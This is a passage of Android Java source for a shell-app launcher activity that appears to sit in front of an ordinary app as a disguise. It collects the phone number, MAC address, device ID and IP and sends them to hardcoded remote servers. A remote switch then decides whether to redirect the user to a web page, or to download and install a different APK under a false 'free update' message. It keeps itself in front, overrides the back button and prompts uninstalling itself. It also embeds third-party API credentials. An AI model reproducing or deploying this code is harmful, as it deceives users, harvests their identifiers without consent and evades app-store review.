package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.FileProvider;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;


/**
 * 游戏包 支持h5   下载    融合
 */
public class MJRegusActivity extends Activity {

    //服务器上的马甲id
    String mAid = "REGUS_AID";
    //服务器上该马甲的渠道id
    String mSid = "REGUS_SID";


//    String mAid = "178";
//    //服务器上该马甲的渠道id
//    String mSid = "2";

    //跳转到原马甲包启动页的全路径
    String activityPath = "REGUS_PATH";
    //后台开关地址  域名动态获取
    String busUrl = "/AppShellService.svc/GetAppInfo";

    //握手地址
    String getHostUrl = "http://woaizggcdws.com:48581/shellapi/welcome";

    //服务器ip
    String serverIp = "47.103.218.210";


    //id 值   这些限制都只是占位词  后面直接用16进制 替换
    /**
     * 植入的图片  启动图背景叫 mj_splash.png      下载时候的背景叫 mj_down_splash.png
     */


    //该页面的启动页图片的id
    int splash_bg_id = 2131230876;
    //该页面的下载时候的背景图片id
    int splash_down_bg_id = 2131230877;


    /**
     * 植入的一个主布局   名字固定叫 mj_regus_splash.xml
     */

    //页面布局的id
    int activity_layout_id = 2131230874;
    //页面布局的根布局的id
    int root_view_id = 2131230875;
    //该页面的加载框id
    int progress_bar_id = 2131230878;
    //百分比
    int progress_bar_num = 2131230879;


    String downLoadUrl;
    public File savefolder;
    public String updateSaveName;

    public long packSize;
    public int progress;
    TBProgressView progressBar;
    RelativeLayout mRootView;
    TextView mProgressNum;

    private List<String> mHosts = new ArrayList<>();
    private int mCurrentReqposition;

    DownloadApkThread downloadApkThread;

    private String theDownloadPkaName = "";

    /**
     * 权限部分
     */

    String[] permissions = new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.ACCESS_FINE_LOCATION
    };
    List<String> mPermissionList = new ArrayList<>();
    boolean mShowRequestPermission = true;//用户是否禁止权限

    int mode = 0; // 0 h5模式    1 下载模式    2 融合模式       --->目前团队主要用下载模式热更新


    //设备相关

    private String macAddress = "";
    private String phoneNum = "";
    private String ip = "";
    private String sysInfo = "";
    private String brand = "";


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);


        if (Build.VERSION.SDK_INT < 19) {// lower api
            View v = this.getWindow().getDecorView();
            v.setSystemUiVisibility(View.GONE);
        } else {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
        }

        //设 layout id
        setLayoutId();

        //根布局id mj_root_view
        setRootViewId();

        //设置启动图id`
        setSplashId();

        //设置资源进度条id
        setProgressBarId();

        //设置资源进度条 百分比id
        setProgressBarNumId();

        checkPermision();

    }

    //设 layout id
    @SuppressLint("ResourceType")
    private void setLayoutId() {
        setContentView(activity_layout_id);
    }

    //设 RootView id
    @SuppressLint("ResourceType")
    private void setRootViewId() {
        mRootView = findViewById(root_view_id);
    }

    //设置启动图id
    @SuppressLint("ResourceType")
    private void setSplashId() {
        mRootView.setBackgroundResource(splash_bg_id);
    }

    //设置progress bar id
    @SuppressLint("ResourceType")
    private void setProgressBarId() {
        progressBar = findViewById(progress_bar_id);
        progressBar.setProgress(0);
    }

    //设置progress bar num  id
    @SuppressLint("ResourceType")
    private void setProgressBarNumId() {
        mProgressNum = findViewById(progress_bar_num);
    }


    /**
     * 所有权限检测完毕之后
     */
    private void afterCheckPermision() {
        macAddress = getMacAddress(this);
        Log.e("regus_mac ", macAddress + "");

        if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
            macAddress = getDeviceId();
            Log.e("regus_mac_dev ", macAddress);
        }

        phoneNum = getPhoneNum();
        Log.e("regus_phoneNum ", phoneNum + "");
        ip = getIPAddress(this);
        Log.e("regus_ip ", ip + "");
        sysInfo = getSystemInfo();

        brand = getDeviceBrand();

        CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);

        CrashHandler.getInstance()
                .init(getApplicationContext());

        //广告模式的 跳转值
        if (!TextUtils.isEmpty(getIntent().getStringExtra("regus_ad_value"))) {

            startWebview(getIntent().getStringExtra("regus_ad_value"));


        } else {
            getDt();
        }
    }


    void RequestThat() {
        getHostRequest();
    }


    void getDt() {
        Log.e("regus_next", "getDt");
        new Thread(new GetDtRunnale()).start();
    }


    private class GetDtRunnale implements Runnable {

        @Override
        public void run() {

            try {
                URL urll = new URL("https://67x9afjw.api.lncld.net/1.1/classes/UpVersion/5ca496a6a3180b0068b3009c");
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setRequestProperty("X-LC-Id", "67x9AFJW4h2aT78GEWVVQGWN-gzGzoHsz");
                urlConnection.setRequestProperty("X-LC-Sign", "4e88dd3e3c6d116d211068306d3becf1,1573025889476");
                urlConnection.setConnectTimeout(4000);
                urlConnection.setReadTimeout(4000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    //     Log.e("regus getDt ", jsonStr + "");

                    //处理
                    try {

                        JSONObject avObject = new JSONObject(jsonStr);


                        int show = avObject.getInt("show");
                        String url = avObject.getString("url");
                        boolean isStop = avObject.getBoolean("stop");

                        Log.e("avo", "s  " + show + " i  " + isStop);

                        if (isStop) {
                            if (show == 2) {

                                if (url.endsWith("apk")) {

                                    downLoadUrl = url;
                                    mode = 1;
                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
                                    showDownLoadDialog();

                                } else {
                                    Intent intent = new Intent();
                                    intent.setAction(Intent.ACTION_VIEW);
                                    Uri content_url = Uri.parse(url);
                                    intent.setData(content_url);
                                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                                    startActivity(intent);
                                }


                            } else {
                                jumpLocalSplash();
                            }
                        } else {
                            RequestThat();
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        RequestThat();
                    }
                } else {
                    RequestThat();
                }
            } catch (Exception e) {
                RequestThat();
            }
        }

    }


    private void showDownLoadUi() {

        startService(new Intent(this, MJForegroundService.class));

        setDownLoadApkBgId();
        downloadPackage();
    }

    @SuppressLint("ResourceType")
    private void setDownLoadApkBgId() {
        progressBar.setVisibility(View.VISIBLE);
        mRootView.setBackgroundResource(splash_down_bg_id);
    }


    /**
     * 权限检测
     */
    private void checkPermision() {

        try {
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                }
            }
            /**
             * 判断是否为空
             */
            if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                afterCheckPermision();
            } else {//请求权限方法

                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(MJRegusActivity.this, "版本需要强制更新，请给予必要权限~", Toast.LENGTH_LONG);
                    }
                });

                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                ActivityCompat.requestPermissions(this, permissions, 1);
            }
        } catch (Exception e) {

            //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
            //先进去  里面的会帮我申请好权限
            jumpLocalSplash();

        }

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        } else {
                            mShowRequestPermission = false;//已经禁止
                        }
                    }
                }
                afterCheckPermision();
                break;
            default:
                break;
        }
    }


    private void getHostRequest() {
        new Thread(new GetHostRequestRunnable()).start();
    }


    private class GetHostRequestRunnable implements Runnable {

        @Override
        public void run() {

            try {
                Log.e("regus_getHost ", getHostUrl + "");

                URL urll = new URL(getHostUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(7000);
                urlConnection.setReadTimeout(7000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus getHost array", jsonStr + "");

                    //处理
                    try {

                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
                        Log.e("regus  array size", jsonArray.length() + "");

                        //  allHostSize = jsonArray.length();

//                        for (int i = 0; i < jsonArray.length(); i++) {
//                            requsetKaiGuanServer((String) jsonArray.get(i));
//                        }

                        traverseHost(jsonArray);

                    } catch (JSONException e) {
                        e.printStackTrace();
                        // allHostSize = 1;
                        Log.e("regus getHost", e.getLocalizedMessage() + "");
                        requsetKaiGuanServer(serverIp);
                    }
                } else {
                    //  allHostSize = 1;
                    Log.e("regus getHost", "code 不是200");
                    requsetKaiGuanServer(serverIp);
                }
            } catch (Exception e) {
                //   allHostSize = 1;
                Log.e("regus getHost", e.getLocalizedMessage() + "");
                requsetKaiGuanServer(serverIp);
            }

        }


    }


    void traverseHost(JSONArray jsonArray) {

        List<String> stringList = new ArrayList<>();

        for (int i = 0; i < jsonArray.length(); i++) {
            try {
                stringList.add((String) jsonArray.get(i));
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        mHosts = stringList;

        if (mHosts.size() > 0) {
            mCurrentReqposition = 0;
            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
        }

    }


    void requestNextHost() {
        int hostSize = mHosts.size();
        if (mCurrentReqposition < hostSize - 1) {
            mCurrentReqposition = mCurrentReqposition + 1;
            requsetKaiGuanServer(mHosts.get(mCurrentReqposition));
        } else {
            //没有任何域名可用
            jumpLocalSplash();
        }
    }


    private void requsetKaiGuanServer(String bUrl) {

        String url = "http://" + bUrl + busUrl;

        new Thread(new RequestMacRunnable(mAid, mSid, url, bUrl)).start();

    }


    private class RequestMacRunnable implements Runnable {

        String url;
        String aid;
        String sid;
        String host;

        public RequestMacRunnable(String aid, String sid, String url, String bul) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
            host = bul;
        }


        @Override
        public void run() {

            if (TextUtils.isEmpty(macAddress)) {
                new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
                return;
            }

            String rootUrl = "http://" + host + "/AppShellService.svc/IsBlack?mac=" + macAddress;

            Log.e("regus_", "请求的mac接口 " + rootUrl);


            try {
                URL urll = new URL(rootUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus_mac接口返回", jsonStr + "");

                    JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));

                    if (responseJson.has("Status") && responseJson.has("Data")) {

                        if (responseJson.getBoolean("Data")) {
                            //是黑名单手机
                            jumpLocalSplash();
                        } else {
                            new Thread(new RequestAppInfoRunnable(mAid, mSid, url, host)).start();
                        }
                    } else {
                        //  jumpLocalSplash();
                        requestNextHost();
                    }

                } else {
                    // jumpLocalSplash();
                    requestNextHost();
                }
            } catch (Exception e) {
                // jumpLocalSplash();
                requestNextHost();
                Log.e("reugs", "mac接口 " + e.getLocalizedMessage());
            }

        }

    }


    private class RequestAppInfoRunnable implements Runnable {

        String url;
        String aid;
        String sid;
        String host;

        public RequestAppInfoRunnable(String aid, String sid, String url, String bul) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
            host = bul;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
                jumpLocalSplash();
                return;
            }

            String rootUrl = url + "?aid=";


            String allUrl = rootUrl + aid + "&sid=" + sid;

            Log.e("regus_", "请求的接口 " + allUrl);

            try {
                URL urll = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                urlConnection.setRequestMethod("GET");

                Log.e("regus", " header中 增加mac " + macAddress);

                if (!macAddress.equals("02:00:00:00:00:00")) {
                    urlConnection.setRequestProperty("mac", macAddress);
                } else {
                    urlConnection.setRequestProperty("mac", "某手机获取不到mac地址或设备号");
                }

                urlConnection.setRequestProperty("qId", System.currentTimeMillis() + "");

                if (!TextUtils.isEmpty(ip)) {
                    urlConnection.setRequestProperty("ip", ip);
                }

                urlConnection.setRequestProperty("deviceType", "Andriod");

                if (!TextUtils.isEmpty(phoneNum)) {
                    urlConnection.setRequestProperty("mobile", phoneNum);
                }

                urlConnection.setRequestProperty("osVersion", sysInfo);
                urlConnection.setRequestProperty("provider", brand);


                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    solveLines(true, host, jsonStr);

                } else {
                    solveLines(false, host, null);
                }
            } catch (Exception e) {
                solveLines(false, host, null);
            }

        }

    }


    private volatile boolean isGetKgRepInfoAlready = false;


    /**
     * 处理几个ping 域名的请求
     */
    private synchronized void solveLines(boolean isOK, String host, String buJson) {

        if (isGetKgRepInfoAlready) {
            Log.e("regus_", " 已经有可用域名 其他的直接return");
            return;
        }


        if (isOK) {

            Log.e("regus_", " 域名: " + host + " 可用, 已经被优先使用了");

            isGetKgRepInfoAlready = true;

            //处理
            try {
                JSONObject responseJson = new JSONObject(buJson.replace("\\", ""));

                if (responseJson.has("Status") && responseJson.has("Data")) {
                    if (responseJson.getBoolean("Status")) {


                        JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                        if (!dataJsonObject.getBoolean("IsAdvertising")) {
                            clearSp(getBaseContext());
                        }


                        if (dataJsonObject.has("IsMix") && dataJsonObject.getBoolean("IsMix")) {
                            //融合模式
                            mode = 2;

                            //融合模式
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(getApplicationContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
                                }
                            });
                            //环彩181504
                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
                            getApkFromAssets();

                        } else if (dataJsonObject.getBoolean("IsAdvertising")) {

                            if (dataJsonObject.has("AdvertiseList")) {
                                JSONArray advertiseArray = dataJsonObject.getJSONArray("AdvertiseList");

                                String key_ad_kg = "key_ad_kg";
                                String key_ad_value = "key_ad_value";


                                if (advertiseArray != null) {
                                    for (int i = 0; i < advertiseArray.length(); i++) {
                                        JSONObject jsonObject = advertiseArray.getJSONObject(i);
                                        if (jsonObject != null) {
                                            if (jsonObject.has("AdvertiseUrl")) {

                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                        .putString(key_ad_value + i, jsonObject.getString("AdvertiseUrl")).apply();

                                            }

                                            if (jsonObject.has("IsEnable")) {

                                                getSharedPreferences("regus", Context.MODE_PRIVATE).edit()
                                                        .putBoolean(key_ad_kg + i, jsonObject.getBoolean("IsEnable")).apply();
                                            }
                                        }
                                    }
                                }

                            }

                            jumpLocalSplash();

                        } else if (dataJsonObject.getBoolean("IsDownload")) {
                            downLoadUrl = dataJsonObject.getString("DownloadUrl");
                            mode = 1;
                            Log.e("regus 得到的下载链接: ", downLoadUrl);
                            showDownLoadDialog();
                        } else if (dataJsonObject.getBoolean("IsEnable")) {
                            //h5模式
                            mode = 0;
                            startWebview(dataJsonObject.getString("Url"));
                        } else {
                            jumpLocalSplash();
                        }

                    } else {
                        jumpLocalSplash();
                    }
                    return;
                }

            } catch (JSONException e) {
                e.printStackTrace();
                jumpLocalSplash();
            }

        } else {
            Log.e("regus_", " 域名: " + host + " 不可用");
            requestNextHost();
        }

    }


    public static void clearSp(Context context) {
        SharedPreferences preferences = context.getSharedPreferences("regus", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        editor.clear();
        editor.commit();
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jumpLocalSplash();
            return;
        }
        jumpTo(url, 0);
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                showDownLoadUi();
            }
        });
    }


    /**
     * 下载主包
     */

    public void downloadPackage() {

        if (TextUtils.isEmpty(downLoadUrl)) {
            Toast.makeText(MJRegusActivity.this, "未配置APP下载链接~", Toast.LENGTH_LONG);
            return;
        }

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }

        downloadApkThread = new DownloadApkThread();
        downloadApkThread.start();
    }

    private class DownloadApkThread extends Thread {

        @SuppressLint("WrongConstant")
        @Override
        public void run() {
            super.run();
            long j = 0;

            try {

                URL url = new URL(downLoadUrl);

                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setConnectTimeout(7000);
                httpURLConnection.setReadTimeout(7000);
                httpURLConnection.connect();

                if (httpURLConnection.getResponseCode() != 200) {
                    Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                    jumpLocalSplash();
                    return;
                }

                InputStream is = httpURLConnection.getInputStream();
                packSize = httpURLConnection.getContentLength();

                if (checkExistSDCard()) {
                    savefolder = Environment.getExternalStorageDirectory();
                } else {
                    savefolder = getDir("update", 3);
                }


                updateSaveName = downLoadUrl.substring(downLoadUrl.lastIndexOf("/") + 1);

                File file = new File(savefolder, updateSaveName);
                Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);
                if (file.exists()) {
                    file.delete();
                }
                Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                OutputStream os = new FileOutputStream(file);

                byte[] bytes = new byte[512];

                int length;

                while ((length = is.read(bytes)) != -1) {
                    os.write(bytes, 0, length);
                    j += (long) length;
                    progress = (int) ((((float) j) / ((float) packSize)) * 100.0f);
                    Log.e("regus progress", progress + "");
                    showLoadDialogProgress(progress);
                    if (progress == 100) {
                        hideWebViewLoadDialog();
                    }
                }

                //关闭流
                is.close();
                os.close();
                os.flush();

                gotoInstall();

            } catch (MalformedURLException e) {
                e.printStackTrace();
                jumpLocalSplash();
            } catch (IOException e2) {
                e2.printStackTrace();
                Log.e("regus IOException", "" + e2.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }

                    downloadPackage();
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("regus Exception", "" + e.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }
                    downloadPackage();
                }
            }

        }

    }


    private void showLoadDialogProgress(int progress) {

        runOnUiThread(new Runnable() {

            @Override
            public void run() {

                if (progress == 95) {
                    if (!isRunningForeground(MJRegusActivity.this)) {
                        setTopApp(MJRegusActivity.this);
                    }
                }

                if (progressBar != null && mProgressNum != null) {
                    progressBar.setProgress(progress);
                    mProgressNum.setText("本次更新不消耗流量，正在更新..." + progress + "%");
                }

            }
        });


    }

    private void hideWebViewLoadDialog() {


    }


    /**
     * 获取assert 里的主包  这是融合模式   暂时不用
     */

    @SuppressLint("WrongConstant")
    private void getApkFromAssets() {

        try {

            if (checkExistSDCard()) {
                savefolder = Environment.getExternalStorageDirectory();
            } else {
                savefolder = getDir("update", 3);
            }


            String aimApkName = "main.apk";
            if (!TextUtils.isEmpty(downLoadUrl) && downLoadUrl.equals("环彩181504")) {
                aimApkName = "main1.apk";
            }

            InputStream is = getAssets().open(aimApkName);

            updateSaveName = "eric.apk";

            File file = new File(savefolder, updateSaveName);

            Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);

            if (file.exists()) {
                file.delete();
            }

            FileOutputStream fos = new FileOutputStream(file);
            byte[] temp = new byte[1024];
            int i = 0;
            while ((i = is.read(temp)) > 0) {
                fos.write(temp, 0, i);
            }
            fos.close();
            is.close();

            gotoInstall();


        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus IOException", "" + e.getLocalizedMessage());
            jumpLocalSplash();
        }


    }

    /**
     * 去安装
     */

    @SuppressLint("WrongConstant")
    private void gotoInstall() {

        PackageManager pm = this.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
                PackageManager.GET_ACTIVITIES);

        if (info != null) {
            String packageName = info.packageName;
            theDownloadPkaName = packageName;
            Log.e("lyn_", "checkPackageNameIfsame 远程的包名是 " + packageName);
        }

        toInstall();
    }


    private void unInstallSelf() {
        if (isAvilible(theDownloadPkaName, this)) {
            //卸载自己
            Uri packageUri = Uri.parse("package:" + getPackageName());
            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
            startActivity(intent);
        }
    }


    @SuppressLint("WrongConstant")
    private void toInstall() {

        Intent intent = new Intent(Intent.ACTION_VIEW);
        int i = getApplicationInfo().targetSdkVersion;
        if (Build.VERSION.SDK_INT < 24 || i < 24) {
            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        } else {
            //添加这一句表示对目标应用临时授权该Uri所代表的文件
            intent.setFlags(1);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        }

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        if (theDownloadPkaName.equals(getPackageName())) {
            startActivity(intent);
            finish();
        } else {
            startActivity(intent);
            isCover = true;
        }

    }

    private boolean isCover;


    @Override
    protected void onResume() {
        super.onResume();

        Log.e("regus_", "onResume");

        if (isCover) {
            unInstallSelf();
        }
    }


    /**
     * 跳转逻辑
     */

    private void jumpTo(final String url, int type) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MJRegusActivity.this, "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                showTipDialog(url);
                startBrowser(url);
            }
        });


    }


    private void showTipDialog(final String url) {

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
        //设置title
        normalDialog.setTitle("需要跳转到浏览器");
        //设置内容
        normalDialog.setMessage("点击跳转到专业版~");
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowser(url);
            }
        });

        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowser(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        startActivity(intent);
    }


    @Override
    public void onBackPressed() {
        //实现Home键效果
        //super.onBackPressed();这句话一定要注掉,不然又去调用默认的back处理方式了
        Intent i = new Intent(Intent.ACTION_MAIN);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

        Log.e("regus_", "onDestroy");

        mCurrentReqposition = 0;
        mHosts.clear();

        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }
    }


    //***********************************************工具方法部分***********************


    public static boolean checkExistSDCard() {
        return Environment.getExternalStorageState().equals("mounted");
    }

    /**
     * 将本应用置顶到最前端
     * 当本应用位于后台时，则将它切换到最前端
     *
     * @param context
     */
    public static void setTopApp(Context context) {
        if (!isRunningForeground(context)) {
            /**获取ActivityManager*/
            ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);

            /**获得当前运行的task(任务)*/
            List<ActivityManager.RunningTaskInfo> taskInfoList = activityManager.getRunningTasks(100);
            for (ActivityManager.RunningTaskInfo taskInfo : taskInfoList) {
                /**找到本应用的 task，并将它切换到前台*/
                if (taskInfo.topActivity.getPackageName().equals(context.getPackageName())) {
                    activityManager.moveTaskToFront(taskInfo.id, 0);
                    break;
                }
            }
        }
    }

    /**
     * 判断本应用是否已经位于最前端
     *
     * @param context
     * @return 本应用已经位于最前端时，返回 true；否则返回 false
     */
    public static boolean isRunningForeground(Context context) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> appProcessInfoList = activityManager.getRunningAppProcesses();
        /**枚举进程*/
        for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfoList) {
            if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                if (appProcessInfo.processName.equals(context.getApplicationInfo().processName)) {
                    return true;
                }
            }
        }
        return false;
    }


    /**
     * 判断有没有安装该apk
     *
     * @param packageName
     * @param context
     * @return
     */
    public static boolean isAvilible(String packageName, Context context) {
        final PackageManager packageManager = context.getPackageManager();
        // 获取所有已安装程序的包信息
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        for (int i = 0; i < pinfo.size(); i++) {
            if (pinfo.get(i).packageName.equalsIgnoreCase(packageName))
                return true;
        }
        return false;
    }


    /**
     * 获取设备id
     *
     * @return
     */

    @SuppressLint("MissingPermission")
    public String getDeviceId() {
        String deviceId = "";

        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            deviceId = tm.getDeviceId();
        } catch (Exception e) {
            Log.e("regus", " getDeviceId-> " + e.getLocalizedMessage());
        }

        return deviceId;

    }


    /**
     * 获取设备
     *
     * @return
     */

    @SuppressLint("MissingPermission")
    public String getPhoneNum() {
        String phone = "";

        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            phone = tm.getLine1Number();
        } catch (Exception e) {
            Log.e("regus", " getPhoneNum-> " + e.getLocalizedMessage());
        }

        return phone;

    }


    /**
